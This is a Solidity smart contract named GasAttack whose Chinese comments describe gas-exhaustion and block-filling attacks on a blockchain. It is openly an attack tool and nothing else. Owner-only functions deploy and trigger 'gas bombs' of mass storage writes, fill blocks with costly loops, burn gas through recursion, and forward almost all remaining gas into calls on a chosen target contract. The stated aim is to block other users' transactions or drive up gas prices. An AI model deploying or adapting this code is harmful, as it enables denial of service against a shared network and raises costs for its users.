// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title GasAttack
 * @notice Gas耗尽与区块填充攻击
 * @dev 通过消耗Gas阻止其他交易执行或抬高Gas价格
 */
contract GasAttack {
    address public owner;
    uint256 public gasConsumed;

    struct GasBomb {
        uint256[] data;
        string payload;
    }

    mapping(uint256 => GasBomb) public bombs;
    uint256 public bombCount;

    event GasBombDeployed(uint256 id, uint256 size);
    event GasConsumed(uint256 amount);
    event BlockFilled(uint256 gasUsed);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice 部署Gas炸弹：大量存储操作消耗Gas
     * @param size 炸弹大小（存储槽数量）
     */
    function deployBomb(uint256 size) external onlyOwner {
        uint256 id = bombCount++;
        GasBomb storage bomb = bombs[id];

        for (uint256 i = 0; i < size; i++) {
            bomb.data.push(i * 999999);
        }
        bomb.payload = string(abi.encodePacked("BOMB_", _uint2str(id)));

        emit GasBombDeployed(id, size);
    }

    /**
     * @notice 触发Gas炸弹
     * @param id 炸弹ID
     */
    function triggerBomb(uint256 id) external onlyOwner {
        GasBomb storage bomb = bombs[id];
        uint256 startGas = gasleft();

        // 大量SSTORE操作消耗Gas
        for (uint256 i = 0; i < bomb.data.length; i++) {
            bomb.data[i] = i * 777777;
        }

        uint256 consumed = startGas - gasleft();
        gasConsumed += consumed;
        emit GasConsumed(consumed);
    }

    /**
     * @notice 区块填充攻击：消耗接近区块Gas上限
     * @param iterations 循环次数
     */
    function fillBlock(uint256 iterations) external onlyOwner {
        uint256 startGas = gasleft();
        uint256 sum = 0;

        for (uint256 i = 0; i < iterations; i++) {
            // 复杂计算消耗Gas
            sum += _complexCalc(i);
            bombs[i % 100].data.push(sum);
        }

        uint256 used = startGas - gasleft();
        emit BlockFilled(used);
    }

    /**
     * @notice 递归调用耗尽Gas
     * @param depth 递归深度
     */
    function recursiveBurn(uint256 depth) external onlyOwner {
        if (depth > 0) {
            this.recursiveBurn(depth - 1);
        }
    }

    /**
     * @notice 针对目标合约进行Gas耗尽攻击
     * @param target 目标合约
     * @param data 调用数据
     */
    function attackTargetGas(address target, bytes calldata data) external onlyOwner {
        uint256 startGas = gasleft();

        (bool success, ) = target.call{gas: gasleft() - 50000}(data);

        uint256 consumed = startGas - gasleft();
        gasConsumed += consumed;
        emit GasConsumed(consumed);
    }

    function _complexCalc(uint256 x) internal pure returns (uint256) {
        return (x * x * x + 7 * x * x + 3 * x + 11) % 1000000007;
    }

    function _uint2str(uint256 _i) internal pure returns (string memory) {
        if (_i == 0) return "0";
        uint256 j = _i;
        uint256 length;
        while (j != 0) {
            length++;
            j /= 10;
        }
        bytes memory bstr = new bytes(length);
        uint256 k = length;
        j = _i;
        while (j != 0) {
            bstr[--k] = bytes1(uint8(48 + j % 10));
            j /= 10;
        }
        return string(bstr);
    }
}
